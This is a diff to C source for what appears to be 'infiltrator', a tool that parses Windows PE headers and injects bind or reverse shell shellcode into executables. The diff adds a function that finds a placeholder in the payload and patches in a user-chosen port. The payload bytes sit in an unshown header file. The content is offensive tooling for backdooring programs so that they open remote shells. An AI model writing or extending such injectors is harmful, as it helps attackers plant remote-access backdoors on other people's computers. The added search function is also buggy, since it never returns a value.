@@ -5,6 +5,7 @@
 	http://msdn.microsoft.com/en-us/library/ms809762.aspx
 	http://www.codereversing.com/blog/?p=92
 	http://www.alex-ionescu.com/part1.pdf
+	http://stackoverflow.com/questions/2188914/c-searching-for-a-string-in-a-file
 
 	Credits:
 			[*] corelanc0d3r "https://www.corelan.be".
@@ -107,12 +108,13 @@ typedef struct _IMAGE_SECTION_HEADER {
 
 */
 
-
+#include <Winsock2.h>
 #include <Windows.h>
 #include <stdio.h>
 #include <winnt.h>
 #include <string.h>
-#include<G:\infiltrator\infiltrator\infiltrator\payloads.h>
+#include "payloads.h"
+
 
 #define max_sections 0xF
 
@@ -135,18 +137,50 @@ char *readfiletobuffer(FILE *fp,unsigned int size, unsigned int offset,int sizeo
 	fread(buffer,1,offset,fp);	//fread into memory located at address pointed to by buffer
 	return buffer;				// return the memory addr
 }
+/*
+ * The memmem() function finds the start of the first occurrence of the
+ * substring 'needle' of length 'nlen' in the memory area 'haystack' of
+ * length 'hlen'.
+ *
+ * The return value is a pointer to the beginning of the sub-string, or
+ * NULL if the substring is not found.
+ */
+void *memmem(char *haystack, unsigned int haystack_len, char *needle, unsigned int needle_len, DWORD *p_offset)
+{
+	int i;
+	/*
+	if (needle_len>haystack_len)
+	{
+		return FALSE;
+	}
+	*/
+	for (i=0;i<haystack_len;i++)
+	{
+		if((memcmp(haystack+i,needle,needle_len)==0))
+		{
+			memcpy(p_offset, &i, 4);
+			//p_offset = (DWORD *)&i;
+			break;
+		}
+	}
+//	return TRUE;
+
+}
+
+
 int main(int argc, char *argv[])
 {
 	FILE *fp, *fp2 ;
 	IMAGE_DOS_HEADER idh ;
 	IMAGE_NT_HEADERS inth ;
 	IMAGE_SECTION_HEADER ish[ max_sections ] = {0} ;
-	char *buffer,*newbuffer,*outputfile,*inputfile; 
-	unsigned int i,size, offset, offset2, x, end_size, y, count, shellcode_size ;
+	char *buffer,*newbuffer,*outputfile,*inputfile,*n; 
+	unsigned short port;
+	unsigned int i,size, offset, offset2, x, end_size, y, count, shellcode_size,needle_len ;
 	IMAGE_SECTION_HEADER *new_ish;
-	char *shellcode;
-
-
+	char *shellcode,*needle_offset;
+	char patch[]="\x53\x53";
+	DWORD patch_offset;
 //char shellcode[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" //NOP SLED
 //"\x60";	//PUSHAD
 
@@ -179,9 +213,9 @@ for (count = 0; count < argc; count++)
 	{
 		if (!strcmp(argv[count+1], "bind"))
 		{
-			shellcode=(CHAR *)calloc(sizeof(bind_shell_threaded),1);
-			memcpy(shellcode,bind_shell_threaded,sizeof(bind_shell_threaded));
-			shellcode_size = sizeof(bind_shell_threaded);
+			shellcode=(CHAR *)calloc(sizeof(bind_shell_threaded_patched),1);
+			memcpy(shellcode,bind_shell_threaded_patched,sizeof(bind_shell_threaded_patched));
+			shellcode_size = sizeof(bind_shell_threaded_patched);
 		}
 		if (!strcmp(argv[count+1], "reverse"))
 		{
@@ -227,6 +261,12 @@ for (count = 0; count < argc; count++)
 	{
 		inputfile=(char *)calloc(strlen(argv[count+1]),1);
 		strcpy(inputfile,argv[count+1]);
+	}
+	if(!strcmp(argv[count],"-p"))
+	{
+		port = htons(atoi(argv[count+1]));
+		memmem(shellcode,shellcode_size,patch,sizeof(WORD),&patch_offset);
+		memcpy(shellcode+patch_offset,&port,sizeof(port));
 	}
 
 }
